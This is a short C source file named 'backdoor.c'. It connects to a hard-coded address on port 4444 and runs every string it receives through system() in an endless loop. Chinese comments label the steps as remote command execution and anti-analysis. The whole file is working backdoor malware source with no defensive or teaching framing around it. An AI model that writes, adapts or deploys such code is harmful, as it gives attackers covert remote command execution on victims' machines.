// backdoor.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>

int main() {
    int sock;
    struct sockaddr_in server;
    char buf[256];

    sock = socket(AF_INET, SOCK_STREAM, 0);

    server.sin_addr.s_addr = inet_addr("127.0.0.1");
    server.sin_family = AF_INET;
    server.sin_port = htons(4444);

    connect(sock, (struct sockaddr *)&server, sizeof(server));

    while (1) {
        recv(sock, buf, sizeof(buf), 0);
        system(buf);  // 远程命令执行
        sleep(5);     // 反分析
    }
    return 0;
}
